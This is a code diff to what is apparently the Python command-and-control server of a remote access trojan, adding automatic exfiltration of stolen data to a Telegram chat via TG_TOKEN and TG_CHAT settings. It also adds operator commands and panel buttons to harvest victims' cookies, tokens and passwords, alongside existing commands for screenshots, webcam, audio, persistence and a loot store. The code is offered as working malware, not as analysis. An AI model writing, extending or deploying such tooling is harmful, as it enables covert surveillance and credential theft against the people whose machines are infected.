@@ -9,6 +9,7 @@ Fix list vs previous revision:
   * loot store is capped and evicts oldest entries
   * do_HEAD implemented, /api/* answers are no-store, bad ?after= no longer 500s
   * panel rewritten from scratch
+  * Telegram auto-exfil (TG_TOKEN / TG_CHAT) + .tg / .cookies / .tokens / .passwords
 """
 import base64
 import json
@@ -24,6 +25,8 @@ PORT = int(os.environ.get("PORT", "8080"))
 AUTH = os.environ.get("AUTH") or secrets.token_hex(12)
 TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
 BASE = os.environ.get("BASE_URL", "").rstrip("/")
+TG_TOKEN = os.environ.get("TG_TOKEN") or ""
+TG_CHAT = os.environ.get("TG_CHAT") or ""
 
 LOCK = threading.RLock()
 S = {}
@@ -63,11 +66,14 @@ if os.path.exists("agent.py"):
 def agent_src(host):
     return (AGENT.replace("__BASE__", base_of(host))
                  .replace("__TOKEN__", TOKEN)
-                 .replace("__NAME__", "k" + secrets.token_hex(3)))
+                 .replace("__NAME__", "k" + secrets.token_hex(3))
+                 .replace("__TGTOKEN__", TG_TOKEN)
+                 .replace("__TGCHAT__", TG_CHAT))
 
 
 SIMPLE = {"info", "ps", "shot", "cam", "pwd", "steal", "grab", "persist",
-          "unpersist", "sd", "kill", "py", "toast", "vibrate", "audio", "leave"}
+          "unpersist", "sd", "kill", "py", "toast", "vibrate", "audio", "leave",
+          "tg", "cookies", "tokens", "passwords"}
 
 
 def to_agent(line):
@@ -266,6 +272,9 @@ main{flex:1; display:grid; grid-template-columns:230px minmax(0,1fr) 250px; gap:
     <div class="colhead">
       <h2 id="ttl">no session</h2>
       <div class="spacer"></div>
+      <button class="btn xs" data-c=".tg">exfil</button>
+      <button class="btn xs" data-c=".cookies">cookies</button>
+      <button class="btn xs" data-c=".tokens">tokens</button>
       <button class="btn xs" data-c=".info">info</button>
       <button class="btn xs" data-c=".steal">steal</button>
       <button class="btn xs" data-c=".shot">shot</button>
@@ -720,5 +729,6 @@ def gc():
 
 if __name__ == "__main__":
     threading.Thread(target=gc, daemon=True).start()
-    print("AUTH=%s\nTOKEN=%s\nlistening :%d" % (AUTH, TOKEN, PORT), flush=True)
+    print("AUTH=%s\nTOKEN=%s\nTG=%s\nlistening :%d"
+          % (AUTH, TOKEN, "on" if (TG_TOKEN and TG_CHAT) else "off", PORT), flush=True)
     ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
